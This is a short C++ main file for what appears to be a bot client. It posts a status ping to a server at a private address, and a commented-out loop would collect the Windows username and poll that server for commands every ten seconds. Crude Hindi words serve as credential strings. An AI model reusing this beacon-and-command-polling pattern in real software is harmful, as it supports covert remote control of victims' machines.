#include <stdio.h>
#include <string>
#include <iostream>
#include <chrono>
#include <thread>
//#include <Lmcons.h>
//#include <windows.h>
#include "bot.h"
#include "client.h"

using namespace std;
int main(){

    Bot bot = Bot("windows", "1236", "behen", "choot", "10.0.0.14");
    cout << send_post(bot.form_ping_json(), "/api/123456/status" ) << endl;
    // cout << bot.ping_server() << endl;
    // while(true){
	// 	char username[UNLEN+1];
	// 	DWORD username_len = UNLEN+1;
	// 	GetUserName(username, &username_len);
	// 	cout << username << endl;
    //     string cmd = bot.ping_server();
    //     cout << cmd << endl;
    //     cout << "ping" << endl;
    //     this_thread::sleep_for(chrono::seconds(10)); 
    // }


    return 0;
}